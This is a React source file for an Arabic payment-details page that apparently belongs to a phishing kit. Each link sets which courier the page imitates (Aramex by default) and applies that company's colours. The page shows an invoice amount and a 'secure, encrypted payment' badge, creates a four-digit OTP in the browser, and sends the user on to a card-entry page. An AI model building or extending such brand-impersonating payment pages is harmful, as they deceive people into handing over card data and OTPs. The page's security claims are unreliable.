import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { getServiceBranding } from "@/lib/serviceLogos";
import { Shield } from "lucide-react";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { useLink, useCreatePayment } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, User } from "lucide-react";

const PaymentDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  const createPayment = useCreatePayment();

  const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
  const serviceName = linkData?.payload?.service_name || "دفع فاتورة";
  const branding = getServiceBranding(serviceKey);
  const shippingInfo = linkData?.payload as any;

  // Use company branding colors
  const colors = {
    primary: branding.colors?.primary || "#CE1126",
    secondary: branding.colors?.secondary || "#00732F",
    accent: branding.colors?.accent || "#000000",
    background: branding.colors?.background || "#FFFFFF",
    surface: branding.colors?.surface || "#F5F5F5",
    border: branding.colors?.border || "#E0E0E0",
    text: branding.colors?.text || "#000000",
    textLight: branding.colors?.textLight || "#666666",
    textOnPrimary: branding.colors?.textOnPrimary || "#FFFFFF",
  };

  // Get country code from link data
  const countryCode = shippingInfo?.selectedCountry || "SA";

  // Get currency info for display
  const currencyInfo = getCurrencyByCountry(countryCode);

  // Get payment data from link data
  const paymentData = shippingInfo?.payment_data;

  // Get amount from payment data or shipping info
  const rawAmount = paymentData?.payment_amount || shippingInfo?.cod_amount || shippingInfo?.payment_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  // Format amount with currency symbol and name
  const formattedAmount = formatCurrency(amount, countryCode);
  
  const handleProceed = async () => {
    const paymentData = await createPayment.mutateAsync({
      link_id: id!,
      amount: amount,
      status: 'pending',
      otp_code: Math.floor(1000 + Math.random() * 9000).toString(),
      otp_attempts: 0
    });
    
    const paymentId = paymentData.data.id;
    navigate(`/pay/${id}/card/${paymentId}`);
  };
  
  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title="تفاصيل الدفع"
      description={`صفحة دفع آمنة ومحمية لخدمة ${serviceName}`}
      icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
    >
      {/* Payment Data Display */}
      {(shippingInfo || paymentData) && (
        <div className="mb-6 sm:mb-8 p-3 sm:p-4 rounded-lg bg-muted/50">
          <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">بيانات السداد</h3>
          <div className="space-y-2 text-xs sm:text-sm">
            {paymentData?.customer_name && (
              <div className="flex items-center gap-2">
                <User className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                <span className="text-muted-foreground">الاسم:</span>
                <span className="font-semibold">{paymentData.customer_name}</span>
              </div>
            )}
            {paymentData?.invoice_number && (
              <div className="flex items-center gap-2">
                <Hash className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                <span className="text-muted-foreground">الرقم المفوتر:</span>
                <span className="font-semibold">{paymentData.invoice_number}</span>
              </div>
            )}
            {paymentData?.selected_service_name && (
              <div className="flex items-center gap-2">
                <Truck className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                <span className="text-muted-foreground">الخدمة:</span>
                <span className="font-semibold">{paymentData.selected_service_name}</span>
              </div>
            )}
            {shippingInfo?.tracking_number && (
              <div className="flex items-center gap-2">
                <Hash className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                <span className="text-muted-foreground">رقم الشحنة:</span>
                <span className="font-semibold">{shippingInfo.tracking_number}</span>
              </div>
            )}
            {shippingInfo?.package_description && (
              <div className="flex items-center gap-2">
                <Package className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                <span className="text-muted-foreground">وصف الطرد:</span>
                <span className="font-semibold">{shippingInfo.package_description}</span>
              </div>
            )}
          </div>
        </div>
      )}
      
      {/* Payment Summary */}
      <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
        {paymentData?.selected_service_name && (
          <div className="flex justify-between py-2 sm:py-3 border-b border-border text-sm sm:text-base">
            <span className="text-muted-foreground">الخدمة</span>
            <span className="font-semibold">{paymentData.selected_service_name}</span>
          </div>
        )}
        {!paymentData?.selected_service_name && (
          <div className="flex justify-between py-2 sm:py-3 border-b border-border text-sm sm:text-base">
            <span className="text-muted-foreground">الخدمة</span>
            <span className="font-semibold">{serviceName}</span>
          </div>
        )}

        <div
          className="flex justify-between py-3 sm:py-4 rounded-lg px-3 sm:px-4"
          style={{
            background: `linear-gradient(135deg, ${colors.primary}15, ${colors.secondary}15)`
          }}
        >
          <span className="text-base sm:text-lg font-bold">المبلغ الإجمالي</span>
          <span className="text-xl sm:text-2xl font-bold" style={{ color: colors.primary }}>
            {formattedAmount}
          </span>
        </div>
      </div>
    
      {/* Payment Method */}
      <div className="mb-6 sm:mb-8">
        <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">طريقة الدفع</h3>
        <div
          className="border-2 rounded-lg sm:rounded-xl p-3 sm:p-4 hover:shadow-md transition-shadow"
          style={{
            borderColor: colors.primary,
            background: `${colors.primary}10`
          }}
        >
          <div className="flex items-center gap-2 sm:gap-3">
            <div
              className="w-10 h-10 rounded-full flex items-center justify-center"
              style={{ backgroundColor: colors.primary }}
            >
              <CreditCard className="w-5 h-5 text-white" />
            </div>
            <div>
              <p className="font-semibold text-sm sm:text-base">الدفع بالبطاقة</p>
              <p className="text-xs sm:text-sm" style={{ color: colors.textLight }}>
                Visa، Mastercard، Mada
              </p>
            </div>
          </div>
        </div>
      </div>

      {/* Security Badge */}
      <div className="mb-6 sm:mb-8">
        <div className="flex items-center gap-3 p-4 bg-white rounded-lg border" style={{ borderColor: colors.secondary }}>
          <div
            className="w-10 h-10 rounded-full flex items-center justify-center"
            style={{ backgroundColor: `${colors.secondary}15` }}
          >
            <Shield className="w-5 h-5" style={{ color: colors.secondary }} />
          </div>
          <div>
            <p className="font-semibold text-sm sm:text-base" style={{ color: colors.text }}>
              دفع آمن ومشفر
            </p>
            <p className="text-xs sm:text-sm" style={{ color: colors.textLight }}>
              جميع المعلومات مُشفرة ومحمية بأعلى معايير الأمان
            </p>
          </div>
        </div>
      </div>
      
      {/* Proceed Button */}
      <Button
        onClick={handleProceed}
        size="lg"
        className="w-full h-14 text-lg font-bold text-white hover:opacity-90 transition-all"
        style={{
          background: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`,
          borderRadius: '12px',
          boxShadow: '0 4px 12px rgba(0,0,0,0.15)'
        }}
      >
        <span className="ml-2">الدفع بالبطاقة</span>
        <ArrowLeft className="w-5 h-5 mr-2" />
      </Button>

      <p className="text-[10px] sm:text-xs text-center mt-4" style={{ color: colors.textLight }}>
        بالمتابعة، أنت توافق على الشروط والأحكام
      </p>
    </DynamicPaymentLayout>
  );
};

export default PaymentDetails;